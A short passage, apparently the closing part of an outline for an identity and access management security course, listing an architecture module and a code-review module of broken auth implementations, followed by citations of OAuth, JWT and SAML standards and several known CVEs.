- **Category 5** — IAM product architecture: how to build multi-tenant key management, graceful degradation, audit log schemas, and SCIM+SAML coordination at scale
- **Category 6** — Code review: 6 real broken implementations to find the bugs in and fix — these are the auth mistakes that ship to production every week at companies that do not have a Principal Engineer reviewing them

> 💬 *"After Document 2, you are a Principal who can defend systems. After Document 3, you are a Principal who can build them."*

---

*OAuth 2.0: RFC 6749 · PKCE: RFC 7636 · JWT: RFC 7519 · Introspection: RFC 7662 · SAML 2.0: OASIS saml-core-2.0-os · CVE-2015-9235: algorithm confusion · CVE-2022-21449: ECDSA psychic signatures · GitHub Enterprise XSW 2017 · SolarWinds SAML forgery 2020*
